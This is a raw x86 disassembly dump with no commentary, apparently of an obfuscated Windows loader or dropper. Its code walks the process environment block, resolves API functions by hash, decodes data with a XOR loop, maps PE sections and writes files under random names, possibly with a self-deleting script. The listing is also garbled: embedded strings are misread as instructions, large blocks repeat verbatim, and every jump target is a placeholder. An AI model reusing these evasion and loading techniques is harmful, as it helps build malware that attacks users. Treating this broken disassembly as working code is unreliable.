adc eax 0x5091f88a
lea eax [ eax - 0x4684bd68 ]
stosd [ edi ]
call sub_4017d2
add [ esi ] bh
and [ ecx ] esp
cmp [ ebx ] ah
insb
jno r-xdata
sub ax [ edx ]
pop es
xor edi [ eax ]
and eax [ edi ]
aas
add [ 0x646d666f ] ebp
ja r-xdata
add al 0x24
sub eax [ gs : ecx ]
sub eax 0x71626b60
inc edx
ja r-xdata
add esp 0x4
or esi esi
adc edi 0x1
mov [ edi - 0x1 ] al
add ecx 0xffffffff
jne r-xdata
add al 0x24
add eax [ eax ]
add [ eax ] al
cmp [ ebx ] ah
pop es
sub [ eax ] ch
sub ah [ ebx ]
add [ eax ] ch
push eax
ja r-xdata
jmp [ esp ]
jmp sub_401819
xor eax [ esp ]
call $+5
add esi 0x1
mov al [ esi - 0x1 ]
sub esp 0x4
mov [ esp ] 0x3
pop es
sub ch [ edx ]
sub [ eax ] dh
xor [ edx ] ebp
cmp [ ebx ] ah
jne r-xdata
inc [ ebx + 0x275ffc1 ]
sub eax 0x66676d6a
jpo r-xdata
push 0x6d
sub eax 0x6e6c7165
inc eax
imul esp [ edx + 0x71 ] 0x40
insb
sub ax [ bp + si ]
xor edi esi
add dl 0x61
call $+5
and edx edx
sbb esi 0xffffffff
mov al [ esi - 0x1 ]
test al al
jne r-xdata
outsd
sub eax [ eax ]
sub al [ ebx ]
xor ecx ecx
cmp al 0xa
cmovb ecx edx
add eax ecx
mov [ edi ] al
test esi esi
sbb edi 0xffffffff
jmp [ esp ]
jmp r-xdata
mov eax [ esp ]
add esp 0x4
add esp 0x4
mov esi [ esp - 0x4 ]
lea edi [ ebp + 0x1080 ]
add esp 0xfffffffc
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
mov ecx 0x0
sub ecx 0x1000
neg ecx
[ edi ] [ esi ]
pop esi
pop edi
add esp 0xfffffffc
mov [ esp ] eax
xor eax [ esp ]
test edx edx
sbb esp 0xfffffffc
mov al [ esi ]
inc esi
stosw [ edi ]
add esp 0xfffffffc
mov [ esp ] ecx
sub ecx eax
pop ecx
jne r-xdata
and ebx 0x0
add ebx [ ebp + 0x4c ]
mov eax 0x0
xor eax [ ebx ]
or edx 0xffffffff
not edx
or edx [ ebp + 0x4c ]
sub esp 0x4
mov [ esp ] edx
call [ eax + 0x4 ]
or ebx ebx
mov esi 0x0
adc esi [ ebp + 0x44 ]
and ecx ecx
mov eax 0x0
adc eax [ esi ]
mov ebx 0x0
add ebx [ ebp + 0x4c ]
mov edx 0x0
sub edx [ ebp + 0x44 ]
neg edx
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov edx 0x0
add edx [ ebp + 0x48 ]
mov ebx 0x0
xor ebx [ ebp + 0x48 ]
mov eax 0x0
or eax [ edx ]
call $+5
mov [ esp ] ebx
call [ eax + 0xc ]
test eax eax
jne r-xdata
or ebx 0xffffffff
not ebx
adc ebx [ ebp + 0x48 ]
mov eax [ ebx ]
push 0x0
push 0x0
add esp 0xfffffffc
mov [ esp ] 0x0
push 0x0
call $+5
mov [ esp ] 0x0
sub esp 0x4
mov [ esp ] 0x0
sub esp 0x4
mov [ esp ] 0x0
sub esp 0x4
mov [ esp ] 0x0
lea edx [ ebp + 0x80 ]
push edx
mov ebx 0x0
or ebx [ ebp + 0x48 ]
sub esp 0x4
mov [ esp ] ebx
call [ eax + 0x14 ]
test eax eax
jne r-xdata
and eax eax
mov [ ebp + 0x8 ] 0x0
adc [ ebp + 0x8 ] 0xbadcaffe
sub_4017d2
add esp 0x4
mov esi [ esp - 0x4 ]
mov ecx 0x0
sub ecx 0xa5735015
neg ecx
lea ecx [ ecx + 0x5a8cb046 ]
call $+5
jmp [ esp ]
jmp sub_401819
add esi 0x1
mov al [ esi - 0x1 ]
sub esp 0x4
mov [ esp ] 0x3
xor eax [ esp ]
add esp 0x4
or esi esi
adc edi 0x1
mov [ edi - 0x1 ] al
add ecx 0xffffffff
jne r-xdata
sub_401819
lea esi [ ebp + 0x80 ]
rdtsc
and dl 0xf
sub esp 0x4
mov [ esp ] esi
mov edi 0x0
xor edi esi
add dl 0x61
call $+5
xor ecx ecx
cmp al 0xa
cmovb ecx edx
add eax ecx
mov [ edi ] al
test esi esi
sbb edi 0xffffffff
jmp [ esp ]
jmp r-xdata
and edx edx
sbb esi 0xffffffff
mov al [ esi - 0x1 ]
test al al
jne r-xdata
mov eax [ esp ]
add esp 0x4
add esp 0x4
mov esi [ esp - 0x4 ]
lea edi [ ebp + 0x1080 ]
add esp 0xfffffffc
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
mov ecx 0x0
sub ecx 0x1000
neg ecx
[ edi ] [ esi ]
pop esi
pop edi
add esp 0xfffffffc
mov [ esp ] eax
xor eax [ esp ]
test edx edx
sbb esp 0xfffffffc
mov al [ esi ]
inc esi
stosw [ edi ]
add esp 0xfffffffc
mov [ esp ] ecx
sub ecx eax
pop ecx
jne r-xdata
and ebx 0x0
add ebx [ ebp + 0x4c ]
mov eax 0x0
xor eax [ ebx ]
or edx 0xffffffff
not edx
or edx [ ebp + 0x4c ]
sub esp 0x4
mov [ esp ] edx
call [ eax + 0x4 ]
or ebx ebx
mov esi 0x0
adc esi [ ebp + 0x44 ]
and ecx ecx
mov eax 0x0
adc eax [ esi ]
mov ebx 0x0
add ebx [ ebp + 0x4c ]
mov edx 0x0
sub edx [ ebp + 0x44 ]
neg edx
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
call [ eax + 0xc ]
test eax eax
jne r-xdata
or ebx 0xffffffff
not ebx
adc ebx [ fs : 0x30 ]
or eax 0xffffffff
not eax
or eax [ ebx + 0x10 ]
add esp 0xfffffffc
mov [ esp ] eax
pop edx
lea edi [ edx + 0x40 ]
xor eax eax
stosd [ edi ]
mov [ edi ] 0x0
xor [ edi ] eax
test eax eax
adc edi 0x4
and ecx 0x0
add ecx 0xb7626af0
lea ecx [ ecx - 0xe82e8ea ]
mov edx 0x0
sub edx [ ebp + 0x4 ]
neg edx
call sub_401c5f
call eax
mov edi 0x0
xor edi eax
mov ecx 0x0
or ecx 0x2000
or eax 0xffffffff
not eax
or eax 0x65322d79
add eax 0x9acdd2b3
[ edi ]
push 0x90b613ca
pop eax
lea eax [ eax + 0x6f49ec56 ]
[ edi ]
or ecx 0xffffffff
not ecx
xor ecx 0x5f73bff5
add ecx 0xb3904593
push [ ebp + 0x4 ]
pop edx
call sub_401c5f
call $+5
mov [ esp ] 0x1
call $+5
mov [ esp ] edi
call eax
push [ ebp + 0x8 ]
pop esi
or edi 0xffffffff
not edi
or edi 0xbadcaffe
call $+5
mov [ esp ] esi
or ebx ebx
sbb esi edi
pop esi
jne r-xdata
mov edx 0x0
add edx [ ebp + 0x48 ]
mov ebx 0x0
xor ebx [ ebp + 0x48 ]
mov eax 0x0
or eax [ edx ]
call $+5
mov [ esp ] ebx
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov ecx 0x0
add ecx 0x9dacd6e7
lea ecx [ ecx + 0x1ea703dc ]
and edx 0x0
add edx [ ebp + 0x4 ]
call sub_401c5f
call eax
call sub_401431
mov eax 0x0
or eax 0xee155ade
add eax 0x91eae523
retn 0x8
push [ ebp + 0x44 ]
pop ebx
test ebx ebx
je r-xdata
or ebx 0xffffffff
not ebx
adc ebx [ ebp + 0x48 ]
mov eax [ ebx ]
push 0x0
push 0x0
add esp 0xfffffffc
mov [ esp ] 0x0
push 0x0
call $+5
mov [ esp ] 0x0
sub esp 0x4
mov [ esp ] 0x0
sub esp 0x4
mov [ esp ] 0x0
sub esp 0x4
mov [ esp ] 0x0
lea edx [ ebp + 0x80 ]
push edx
mov ebx 0x0
or ebx [ ebp + 0x48 ]
sub esp 0x4
mov [ esp ] ebx
call [ eax + 0x14 ]
test eax eax
jne r-xdata
sub esp 0x4
mov [ esp ] 0x2
and edx 0x0
add edx [ ebp + 0x44 ]
mov eax 0x0
add eax [ ebx ]
add esp 0xfffffffc
mov [ esp ] edx
call [ eax + 0x14 ]
and eax eax
mov [ ebp + 0x8 ] 0x0
adc [ ebp + 0x8 ] 0xbadcaffe
sub_401c5f
push ebx
add esp 0xfffffffc
mov [ esp ] esi
call $+5
mov [ esp ] ebp
sub esp 0x4
mov [ esp ] edi
or ebp 0xffffffff
not ebp
adc ebp ecx
push edx
pop eax
test esi esi
mov esi 0x0
adc esi eax
mov eax 0x0
sub eax [ esi + 0x3c ]
neg eax
push edi
xor edi [ esp ]
test edx edx
sbb esp 0xfffffffc
lea ecx [ esi + eax ]
and esi esi
adc edi esi
add edi [ ecx + 0x78 ]
and ecx 0x0
add ecx [ edi + 0x20 ]
add ecx esi
or ebx 0xffffffff
not ebx
xor ebx ecx
or eax 0xffffffff
not eax
xor eax [ ecx ]
or ecx 0xffffffff
not ecx
add ecx eax
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] esi
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] edi
mov edi [ esp ]
add esp 0x4
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov ebx [ esp - 0x4 ]
mov eax [ esp ]
add esp 0x4
xor edx edx
call $+5
and ecx ecx
adc esi ebx
sub esp 0x4
mov [ esp ] eax
push eax
xor eax [ esp ]
test edx edx
adc esp 0x4
xor ecx ecx
call $+5
lodsb [ esi ]
test al al
jne r-xdata
push eax
xor ecx [ esp ]
sub esp 0xfffffffc
rol ecx 0x3
shl eax 0x8
and ebx ebx
sbb ecx 0xffffffff
jmp [ esp ]
jmp r-xdata
mov eax [ esp ]
add esp 0x4
mov eax [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] ebp
sub ebp ecx
pop ebp
je r-xdata
add esp 0xfffffffc
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edi
pop edi
mov esi [ esp ]
add esp 0x4
mov eax [ esp ]
add esp 0x4
pop ebx
or ecx 0xffffffff
not ecx
adc ecx [ edi + 0x24 ]
test ebx ebx
adc ecx esi
xor ebx ebx
movzx edx [ ecx + eax * 2 ]
or esi esi
mov ecx 0x0
adc ecx [ edi + 0x1c ]
or ebx ebx
adc ecx esi
and edi edi
adc ebx [ ecx + edx * 4 ]
or edi edi
adc ebx esi
sub esp 0x4
mov [ esp ] ebx
pop eax
mov edi [ esp ]
add esp 0x4
mov ebp [ esp ]
add esp 0x4
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
retn
add eax 0x4
inc edx
and esi 0x0
add esi [ eax ]
cmp edx [ edi + 0x18 ]
jae r-xdata
jmp [ esp ]
init
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov ebp [ eax + 0x18 ]
mov edi [ eax + 0x30 ]
mov eax [ eax ]
cmp [ edi + 0x8 ] 0x6c0065
jne r-xdata
mov ecx 0x444852a2
mov edx ebp
call sub_402a8c
push 0x0
push 0xa1
push 0x3
push 0x0
push 0x0
push 0x80000000
call sub_4026f8
arpl [ edx ] di
pop esp
push edi
imul ebp [ esi + 0x64 ] 0x5c73776f
jae r-xdata
retn 0x8928
jae r-xdata
or dh al
insd
xor esi [ edx ]
pop esp
jpe r-xdata
dec eax
js r-xdata
cmp ecx [ edx + 0x8 ]
jae r-xdata
jpe r-xdata
jo r-xdata
pop edx
lea eax [ ebx + esi ]
sub eax [ edx + 0x28 ]
mov edi [ edx + 0x78 ]
add edi eax
mov ecx [ edi + 0x14 ]
mov edi [ edi + 0x1c ]
add edi eax
mov eax [ edx + 0x28 ]
add eax 0x8
[ edi ]
lea edi [ ebx + esi ]
jmp r-xdata
cmp [ edx ] 0x6c65722e
jne r-xdata
mov ebx ecx
add ebx [ edx + 0x14 ]
mov ecx [ edx + 0x10 ]
xor eax eax
[ edi ]
add edx 0x28
mov ecx edi
sub ecx [ edx + 0xc ]
jb r-xdata
lea edx [ edx + ecx - 0x10 ]
mov edi [ edx + 0x28 ]
insb
jb r-xdata
call sub_4027ac
mov eax 0x1
retn 0xc
mov edi [ edx + 0x14 ]
add edi esi
add [ edi + 0x6a ] dl
inc eax
call eax
test eax eax
je r-xdata
insb
insb
add bh bh
rol [ ebp + 0x3e880fc0 ] 0x1
add eax [ eax ]
add [ ecx + 0x4be9b9c3 ] cl
lodsb [ esi ]
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
mov edi eax
mov ecx 0x526b2cc2
mov edx ebp
call sub_402a8c
push edi
push 0x40
mov ecx 0xbc53dac3
mov edx ebp
call sub_402a8c
push 0x0
call eax
mov esi eax
mov ecx 0xc7ab0b6f
call sub_402a50
test eax eax
je r-xdata
push esi
push edi
movzx edx [ esi + 0x3c ]
lea edx [ esi + edx ]
push edx
movzx eax [ edx + 0x6 ]
movzx ecx [ edx + 0x14 ]
sub_4026f8
call eax
test eax eax
js r-xdata
mov ecx 0xbc53dac3
mov edx ebp
call sub_402a8c
push 0x0
call eax
mov ebx eax
mov ecx 0xf2ac4be9
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
mov edi eax
mov ecx 0x526b2cc2
mov edx ebp
call sub_402a8c
push edi
push 0x40
call eax
test eax eax
je r-xdata
mov esi eax
mov ecx 0xc7ab0b6f
call sub_402a50
test eax eax
je r-xdata
push esi
push edi
movzx edx [ esi + 0x3c ]
lea edx [ esi + edx ]
push edx
movzx eax [ edx + 0x6 ]
movzx ecx [ edx + 0x14 ]
mov edi [ edx + 0x28 ]
lea edx [ edx + ecx - 0x10 ]
dec eax
js r-xdata
cmp ecx [ edx + 0x8 ]
jae r-xdata
pop edx
lea eax [ ebx + esi ]
sub eax [ edx + 0x28 ]
mov edi [ edx + 0x78 ]
add edi eax
mov ecx [ edi + 0x14 ]
mov edi [ edi + 0x1c ]
add edi eax
mov eax [ edx + 0x28 ]
add eax 0x8
[ edi ]
lea edi [ ebx + esi ]
jmp r-xdata
cmp [ edx ] 0x6c65722e
jne r-xdata
mov ebx ecx
add ebx [ edx + 0x14 ]
call sub_4027ac
mov eax 0x1
retn 0xc
add edx 0x28
mov ecx edi
sub ecx [ edx + 0xc ]
jb r-xdata
mov edi [ edx + 0x14 ]
add edi esi
mov ecx [ edx + 0x10 ]
xor eax eax
[ edi ]
sub_4027ac
pop esi
mov ecx 0x1690
[ edi ] [ esi ]
pop edi
pop esi
mov ecx 0x444852a2
mov edx ebp
call sub_402a8c
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
call sub_4027de
imul ebp [ esi + 0x69 ] 0xd0ff0074
test eax eax
js r-xdata
mov ecx 0xbc53dac3
mov edx ebp
call sub_402a8c
push 0x0
call eax
mov ebx eax
mov ecx 0x77eef043
call sub_402a50
test eax eax
je r-xdata
mov ecx 0x444852a2
mov edx ebp
call sub_402a8c
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
call sub_402828
imul ebp [ esi + 0x69 ] 0x6d632e74
add [ fs : ebx - 0x2f00dbe4 ] cl
test eax eax
js r-xdata
push ebx
mov ebx eax
call sub_4029b2
jo r-xdata
jae r-xdata
outsb
and [ bx + 0x6f ] ah
outsd
insb
arpl [ cs : edi + 0x6d ] bp
or ah [ esi + 0x6f ]
jb r-xdata
js r-xdata
dec edi
push edi
xor al 0xa
insd
outsd
jbe r-xdata
cmp eax 0x737e2525
imul ecx [ edx ] 0x20746573
jo r-xdata
and eax 0x69206925
outsb
and [ eax ] ch
and ah [ 0x72657375 ]
jo r-xdata
imul esi [ edx + 0x25 ] 0x2570255c
pop esp
imul bp [ ebp + 0x5c ] 0x6853
insb
insb
and [ edi ] ch
and cl [ edi + 0x70 ]
outsb
and [ edi ] ch
pop ecx
and [ ecx + 0x6e ] ch
imul esi [ eax + 0x25 ] 0x740a2564
jns r-xdata
and eax 0x740a2564
jae r-xdata
je r-xdata
outsd
imul bp [ ebp + 0x25 ] 0x2922
and [ edi + ebp * 2 + 0x20 ] ah
jae r-xdata
inc edx
lodsb [ esi ]
stosb [ edi ]
cmp al 0x2c
jne r-xdata
outsb
xor esi [ edx ]
r-xdata
and [ edi ] ch
and [ edi ] ch
and [ fs : edx ] ah
jb r-xdata
and [ bx + di + 0x64 ] ah
and [ fs : eax + 0x4b ] cl
inc ebx
push ebp
pop esp
push ebx
outsd
je r-xdata
pop esp
and [ gs : 0x695c2564 ] ah
popad
jae r-xdata
jae r-xdata
pop esp
dec edi
jo r-xdata
jae r-xdata
jne r-xdata
je r-xdata
mov [ edi - 0x1 ] 0xa
call sub_402a14
insb
pop edi
mov edx 0x175
and [ 0x6e5c2564 ] ah
je r-xdata
outsb
and cl [ edx ]
jb r-xdata
outsb
add [ eax ] al
popad
je r-xdata
sub ah [ edx ]
or ah [ ebp + 0x6c ]
popad
jb r-xdata
and [ edi ] ch
jno r-xdata
insb
jae r-xdata
jb r-xdata
jae r-xdata
pop esp
inc ebx
insb
insd
xor esi [ edx ]
or ch [ ecx + 0x66 ]
and [ ebp + 0x66 ] ah
imul ebp [ esi + 0x65 ] 0x72502064
lea edi [ esp - 0x275 ]
push edi
mov ecx 0x175
outsb
pop esp
inc ebx
outsd
insd
insd
popad
outsb
and [ fs : edi ] ch
jbe r-xdata
pop esp
jb r-xdata
insb
jb r-xdata
outsd
jb r-xdata
and [ fs : eax + 0x72 ] dl
mov ecx 0x13040588
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
and [ 0x695c2564 ] ah
outsb
imul esi [ eax + 0x26 ] 0x6c656420
insb
jae r-xdata
mov al 0x20
[ edi ]
[ edi ]
lea esi [ edi - 0x1 ]
fild [ eax - 0x42171577 ]
add [ eax ] al
add bh bh
ror [ ecx + 0x100b9c7 ] 0x1
add [ eax ] al
imul ebp [ esi + 0x69 ] 0x6f522c74
jne r-xdata
inc ebx
popad
insb
inc ebx
insb
popad
jae r-xdata
pop esp
inc ebp
js r-xdata
das
inc ebp
insd
push edi
xor al 0x33
xor ah [ eax ]
jae r-xdata
[ edi ] [ esi ]
push edi
mov ecx 0xa8df8206
mov edx ebp
call sub_402a8c
call eax
mov edi eax
mov ecx 0x100
and [ edi ] ch
and [ fs : edx ] ah
and eax 0x646e6977
and [ edi ] ch
insb
and [ 0xa222a25 ] ah
imul bp [ ebp + 0x5c ] 0x6853
insb
jbe r-xdata
pop esp
push ebx
push 0x206c6c65
das
popad
je r-xdata
sub al 0x75
stc
and [ ecx + 0x6e ] ch
imul esi [ esi + ebp + 0x2a ] 0xa712f20
pop esi
mov ecx 0x1d
[ edi ] [ esi ]
lea edi [ edx + 0x1d ]
pop esi
mov ecx 0x77eef043
call sub_402a50
pop ebx
test eax eax
je r-xdata
insb
and [ edx + 0x25 ] bl
and eax 0x20225c31
and eax 0xa222a25
push esp
push 0x6c614365
je r-xdata
dec edi
jo r-xdata
and [ edx ] ah
imul ebp [ esi + 0x69 ] 0x65720a74
and [ bx + di + 0x64 ] ah
outsb
imul esi [ esi + edi + 0x25 ] 0x6e5c2564
and [ 0x695c2564 ] ah
jo r-xdata
pop esp
and eax 0x725c2570
jne r-xdata
popad
jb r-xdata
and [ fs : eax + 0x4b ] cl
inc ebx
push ebp
pop esp
push ebx
outsd
je r-xdata
and [ gs : bx + di + 0x64 ] ah
push ebx
jns r-xdata
insb
insb
push edi
sub_4027de
call eax
test eax eax
js r-xdata
mov ecx 0xbc53dac3
mov edx ebp
call sub_402a8c
push 0x0
call eax
mov ebx eax
mov ecx 0x77eef043
call sub_402a50
test eax eax
je r-xdata
mov ecx 0x444852a2
mov edx ebp
call sub_402a8c
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
call sub_402828
imul ebp [ esi + 0x69 ] 0x6d632e74
add [ fs : ebx - 0x2f00dbe4 ] cl
test eax eax
js r-xdata
push ebx
mov ebx eax
call sub_4029b2
jo r-xdata
jae r-xdata
outsb
and [ bx + 0x6f ] ah
outsd
insb
arpl [ cs : edi + 0x6d ] bp
or ah [ esi + 0x6f ]
jb r-xdata
js r-xdata
dec edi
push edi
xor al 0xa
insd
outsd
jbe r-xdata
cmp eax 0x737e2525
imul ecx [ edx ] 0x20746573
jo r-xdata
and eax 0x69206925
outsb
and [ eax ] ch
and ah [ 0x72657375 ]
jo r-xdata
imul esi [ edx + 0x25 ] 0x2570255c
pop esp
imul bp [ ebp + 0x5c ] 0x6853
insb
insb
and [ edi ] ch
and cl [ edi + 0x70 ]
outsb
and [ edi ] ch
pop ecx
and [ ecx + 0x6e ] ch
imul esi [ eax + 0x25 ] 0x740a2564
jns r-xdata
and eax 0x740a2564
jae r-xdata
je r-xdata
outsd
imul bp [ ebp + 0x25 ] 0x2922
and [ edi + ebp * 2 + 0x20 ] ah
jae r-xdata
inc edx
lodsb [ esi ]
stosb [ edi ]
cmp al 0x2c
jne r-xdata
outsb
xor esi [ edx ]
r-xdata
and [ edi ] ch
and [ edi ] ch
and [ fs : edx ] ah
jb r-xdata
and [ bx + di + 0x64 ] ah
and [ fs : eax + 0x4b ] cl
inc ebx
push ebp
pop esp
push ebx
outsd
je r-xdata
pop esp
and [ gs : 0x695c2564 ] ah
popad
jae r-xdata
jae r-xdata
pop esp
dec edi
jo r-xdata
jae r-xdata
jne r-xdata
je r-xdata
mov [ edi - 0x1 ] 0xa
call sub_402a14
insb
pop edi
mov edx 0x175
and [ 0x6e5c2564 ] ah
je r-xdata
outsb
and cl [ edx ]
jb r-xdata
outsb
add [ eax ] al
popad
je r-xdata
sub ah [ edx ]
or ah [ ebp + 0x6c ]
popad
jb r-xdata
and [ edi ] ch
jno r-xdata
insb
jae r-xdata
jb r-xdata
jae r-xdata
pop esp
inc ebx
insb
insd
xor esi [ edx ]
or ch [ ecx + 0x66 ]
and [ ebp + 0x66 ] ah
imul ebp [ esi + 0x65 ] 0x72502064
lea edi [ esp - 0x275 ]
push edi
mov ecx 0x175
outsb
pop esp
inc ebx
outsd
insd
insd
popad
outsb
and [ fs : edi ] ch
jbe r-xdata
pop esp
jb r-xdata
insb
jb r-xdata
outsd
jb r-xdata
and [ fs : eax + 0x72 ] dl
mov ecx 0x13040588
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
and [ 0x695c2564 ] ah
outsb
imul esi [ eax + 0x26 ] 0x6c656420
insb
jae r-xdata
mov al 0x20
[ edi ]
[ edi ]
lea esi [ edi - 0x1 ]
fild [ eax - 0x42171577 ]
add [ eax ] al
add bh bh
ror [ ecx + 0x100b9c7 ] 0x1
add [ eax ] al
imul ebp [ esi + 0x69 ] 0x6f522c74
jne r-xdata
inc ebx
popad
insb
inc ebx
insb
popad
jae r-xdata
pop esp
inc ebp
js r-xdata
das
inc ebp
insd
push edi
xor al 0x33
xor ah [ eax ]
jae r-xdata
[ edi ] [ esi ]
push edi
mov ecx 0xa8df8206
mov edx ebp
call sub_402a8c
call eax
mov edi eax
mov ecx 0x100
and [ edi ] ch
and [ fs : edx ] ah
and eax 0x646e6977
and [ edi ] ch
insb
and [ 0xa222a25 ] ah
imul bp [ ebp + 0x5c ] 0x6853
insb
jbe r-xdata
pop esp
push ebx
push 0x206c6c65
das
popad
je r-xdata
sub al 0x75
stc
and [ ecx + 0x6e ] ch
imul esi [ esi + ebp + 0x2a ] 0xa712f20
pop esi
mov ecx 0x1d
[ edi ] [ esi ]
lea edi [ edx + 0x1d ]
pop esi
mov ecx 0x77eef043
call sub_402a50
pop ebx
test eax eax
je r-xdata
insb
and [ edx + 0x25 ] bl
and eax 0x20225c31
and eax 0xa222a25
push esp
push 0x6c614365
je r-xdata
dec edi
jo r-xdata
and [ edx ] ah
imul ebp [ esi + 0x69 ] 0x65720a74
and [ bx + di + 0x64 ] ah
outsb
imul esi [ esi + edi + 0x25 ] 0x6e5c2564
and [ 0x695c2564 ] ah
jo r-xdata
pop esp
and eax 0x725c2570
jne r-xdata
popad
jb r-xdata
and [ fs : eax + 0x4b ] cl
inc ebx
push ebp
pop esp
push ebx
outsd
je r-xdata
and [ gs : bx + di + 0x64 ] ah
push ebx
jns r-xdata
insb
insb
push edi
sub_402828
mov ebx [ esp ]
call eax
test eax eax
js r-xdata
mov ecx 0xbc53dac3
mov edx ebp
call sub_402a8c
push 0x0
call eax
push ebx
mov ebx eax
call sub_4029b2
jo r-xdata
jae r-xdata
outsb
and [ bx + 0x6f ] ah
outsd
insb
arpl [ cs : edi + 0x6d ] bp
or ah [ esi + 0x6f ]
jb r-xdata
js r-xdata
dec edi
push edi
xor al 0xa
insd
outsd
jbe r-xdata
cmp eax 0x737e2525
imul ecx [ edx ] 0x20746573
jo r-xdata
and eax 0x69206925
outsb
and [ eax ] ch
and ah [ 0x72657375 ]
jo r-xdata
imul esi [ edx + 0x25 ] 0x2570255c
pop esp
imul bp [ ebp + 0x5c ] 0x6853
insb
insb
and [ edi ] ch
and cl [ edi + 0x70 ]
outsb
and [ edi ] ch
pop ecx
and [ ecx + 0x6e ] ch
imul esi [ eax + 0x25 ] 0x740a2564
jns r-xdata
and eax 0x740a2564
jae r-xdata
je r-xdata
outsd
imul bp [ ebp + 0x25 ] 0x2922
and [ edi + ebp * 2 + 0x20 ] ah
jae r-xdata
inc edx
lodsb [ esi ]
stosb [ edi ]
cmp al 0x2c
jne r-xdata
outsb
xor esi [ edx ]
r-xdata
and [ edi ] ch
and [ edi ] ch
and [ fs : edx ] ah
jb r-xdata
and [ bx + di + 0x64 ] ah
and [ fs : eax + 0x4b ] cl
inc ebx
push ebp
pop esp
push ebx
outsd
je r-xdata
pop esp
and [ gs : 0x695c2564 ] ah
popad
jae r-xdata
jae r-xdata
pop esp
dec edi
jo r-xdata
jae r-xdata
jne r-xdata
je r-xdata
mov [ edi - 0x1 ] 0xa
call sub_402a14
insb
pop edi
mov edx 0x175
and [ 0x6e5c2564 ] ah
je r-xdata
outsb
and cl [ edx ]
jb r-xdata
outsb
add [ eax ] al
popad
je r-xdata
sub ah [ edx ]
or ah [ ebp + 0x6c ]
popad
jb r-xdata
and [ edi ] ch
jno r-xdata
insb
jae r-xdata
jb r-xdata
jae r-xdata
pop esp
inc ebx
insb
insd
xor esi [ edx ]
or ch [ ecx + 0x66 ]
and [ ebp + 0x66 ] ah
imul ebp [ esi + 0x65 ] 0x72502064
lea edi [ esp - 0x275 ]
push edi
mov ecx 0x175
outsb
pop esp
inc ebx
outsd
insd
insd
popad
outsb
and [ fs : edi ] ch
jbe r-xdata
pop esp
jb r-xdata
insb
jb r-xdata
outsd
jb r-xdata
and [ fs : eax + 0x72 ] dl
mov ecx 0x13040588
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
and [ 0x695c2564 ] ah
outsb
imul esi [ eax + 0x26 ] 0x6c656420
insb
jae r-xdata
mov al 0x20
[ edi ]
[ edi ]
lea esi [ edi - 0x1 ]
fild [ eax - 0x42171577 ]
add [ eax ] al
add bh bh
ror [ ecx + 0x100b9c7 ] 0x1
add [ eax ] al
imul ebp [ esi + 0x69 ] 0x6f522c74
jne r-xdata
inc ebx
popad
insb
inc ebx
insb
popad
jae r-xdata
pop esp
inc ebp
js r-xdata
das
inc ebp
insd
push edi
xor al 0x33
xor ah [ eax ]
jae r-xdata
[ edi ] [ esi ]
push edi
mov ecx 0xa8df8206
mov edx ebp
call sub_402a8c
call eax
mov edi eax
mov ecx 0x100
and [ edi ] ch
and [ fs : edx ] ah
and eax 0x646e6977
and [ edi ] ch
insb
and [ 0xa222a25 ] ah
imul bp [ ebp + 0x5c ] 0x6853
insb
jbe r-xdata
pop esp
push ebx
push 0x206c6c65
das
popad
je r-xdata
sub al 0x75
stc
and [ ecx + 0x6e ] ch
imul esi [ esi + ebp + 0x2a ] 0xa712f20
pop esi
mov ecx 0x1d
[ edi ] [ esi ]
lea edi [ edx + 0x1d ]
pop esi
mov ecx 0x77eef043
call sub_402a50
pop ebx
test eax eax
je r-xdata
insb
and [ edx + 0x25 ] bl
and eax 0x20225c31
and eax 0xa222a25
push esp
push 0x6c614365
je r-xdata
dec edi
jo r-xdata
and [ edx ] ah
imul ebp [ esi + 0x69 ] 0x65720a74
and [ bx + di + 0x64 ] ah
outsb
imul esi [ esi + edi + 0x25 ] 0x6e5c2564
and [ 0x695c2564 ] ah
jo r-xdata
pop esp
and eax 0x725c2570
jne r-xdata
popad
jb r-xdata
and [ fs : eax + 0x4b ] cl
inc ebx
push ebp
pop esp
push ebx
outsd
je r-xdata
and [ gs : bx + di + 0x64 ] ah
push ebx
jns r-xdata
insb
insb
push edi
sub_4029b2
pop esi
mov ecx 0x175
lea edi [ esp - 0x275 ]
push edi
[ edi ] [ esi ]
push edi
mov ecx 0xa8df8206
mov edx ebp
call sub_402a8c
call eax
mov edi eax
mov ecx 0x100
mov al 0x20
[ edi ]
[ edi ]
lea esi [ edi - 0x1 ]
pop edi
mov edx 0x175
inc edx
lodsb [ esi ]
stosb [ edi ]
cmp al 0x2c
jne r-xdata
mov [ edi - 0x1 ] 0xa
call sub_402a14
insb
and [ 0x695c2564 ] ah
outsb
imul esi [ eax + 0x26 ] 0x6c656420
and [ ecx + 0x6e ] ch
imul esi [ esi + ebp + 0x2a ] 0xa712f20
pop esi
mov ecx 0x1d
[ edi ] [ esi ]
lea edi [ edx + 0x1d ]
pop esi
mov ecx 0x77eef043
call sub_402a50
pop ebx
test eax eax
je r-xdata
mov ecx 0xbc53dac3
mov edx ebp
call sub_402a8c
push 0x0
call eax
mov ecx 0x13040588
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
sub_402a14
pop esi
mov ecx 0x1d
[ edi ] [ esi ]
lea edi [ edx + 0x1d ]
pop esi
mov ecx 0x77eef043
call sub_402a50
pop ebx
test eax eax
je r-xdata
mov ecx 0xbc53dac3
mov edx ebp
